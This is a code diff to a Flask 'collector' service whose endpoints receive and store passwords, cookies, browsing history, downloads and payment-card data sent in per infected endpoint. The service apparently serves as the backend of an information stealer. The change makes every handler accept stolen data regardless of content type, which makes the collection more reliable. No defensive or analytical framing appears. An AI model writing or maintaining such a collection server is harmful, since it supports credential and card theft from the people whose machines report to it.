@@ -8,7 +8,7 @@ collector_bp = Blueprint('collector', __name__)
 @collector_bp.route('/api/register', methods=['POST'])
 def register_endpoint():
     try:
-        data = request.get_json()
+        data = request.get_json(force=True)
         endpoint_id = data.get('id') or data.get('endpoint_id')
         
         if not endpoint_id:
@@ -34,7 +34,7 @@ def register_endpoint():
 @collector_bp.route('/api/full_report', methods=['POST'])
 def receive_full_report():
     try:
-        data = request.get_json()
+        data = request.get_json(force=True)
         endpoint_id = data.get('endpoint_id')
         report_data = data.get('report_data', {})
         
@@ -97,7 +97,7 @@ def receive_full_report():
 
 @collector_bp.route('/api/browser_data', methods=['POST'])
 def receive_browser_data():
-    data = request.get_json()
+    data = request.get_json(force=True)
     endpoint_id = data.get('endpoint_id', 'unknown')
     if endpoint_id not in store.endpoints:
         store.endpoints[endpoint_id] = {}
@@ -108,7 +108,7 @@ def receive_browser_data():
 @collector_bp.route('/api/passwords_data', methods=['GET', 'POST'])
 def passwords_data():
     if request.method == 'POST':
-        data = request.get_json()
+        data = request.get_json(force=True)
         endpoint_id = data.get('endpoint_id', 'unknown')
         if endpoint_id not in store.endpoints: store.endpoints[endpoint_id] = {}
         if 'passwords' not in store.endpoints[endpoint_id]: store.endpoints[endpoint_id]['passwords'] = []
@@ -125,7 +125,7 @@ def passwords_data():
 @collector_bp.route('/api/cookies_data', methods=['GET', 'POST'])
 def cookies_data():
     if request.method == 'POST':
-        data = request.get_json()
+        data = request.get_json(force=True)
         endpoint_id = data.get('endpoint_id', 'unknown')
         if endpoint_id not in store.endpoints: store.endpoints[endpoint_id] = {}
         if 'cookies' not in store.endpoints[endpoint_id]: store.endpoints[endpoint_id]['cookies'] = []
@@ -142,7 +142,7 @@ def cookies_data():
 @collector_bp.route('/api/history_data', methods=['GET', 'POST'])
 def history_data():
     if request.method == 'POST':
-        data = request.get_json()
+        data = request.get_json(force=True)
         endpoint_id = data.get('endpoint_id', 'unknown')
         if endpoint_id not in store.endpoints: store.endpoints[endpoint_id] = {}
         if 'history' not in store.endpoints[endpoint_id]: store.endpoints[endpoint_id]['history'] = []
@@ -159,7 +159,7 @@ def history_data():
 @collector_bp.route('/api/downloads_data', methods=['GET', 'POST'])
 def downloads_data():
     if request.method == 'POST':
-        data = request.get_json()
+        data = request.get_json(force=True)
         endpoint_id = data.get('endpoint_id', 'unknown')
         if endpoint_id not in store.endpoints: store.endpoints[endpoint_id] = {}
         if 'downloads' not in store.endpoints[endpoint_id]: store.endpoints[endpoint_id]['downloads'] = []
@@ -176,7 +176,7 @@ def downloads_data():
 @collector_bp.route('/api/cards_data', methods=['GET', 'POST'])
 def cards_data():
     if request.method == 'POST':
-        data = request.get_json()
+        data = request.get_json(force=True)
         endpoint_id = data.get('endpoint_id', 'unknown')
         if endpoint_id not in store.endpoints: store.endpoints[endpoint_id] = {}
         if 'cards' not in store.endpoints[endpoint_id]: store.endpoints[endpoint_id]['cards'] = []
@@ -193,7 +193,7 @@ def cards_data():
 @collector_bp.route('/api/metrics', methods=['POST'])
 def receive_metrics():
     try:
-        data = request.json
+        data = request.get_json(force=True)
         endpoint_id = data.get('endpoint_id', 'unknown')
         metrics = data.get('metrics', {})
         if endpoint_id:
@@ -209,7 +209,7 @@ def receive_metrics():
 @collector_bp.route('/api/heartbeat', methods=['POST'])
 def receive_heartbeat():
     try:
-        data = request.json
+        data = request.get_json(force=True)
         endpoint_id = data.get('endpoint_id', 'unknown')
         status = data.get('status', 'unknown')
         if endpoint_id in store.endpoints:
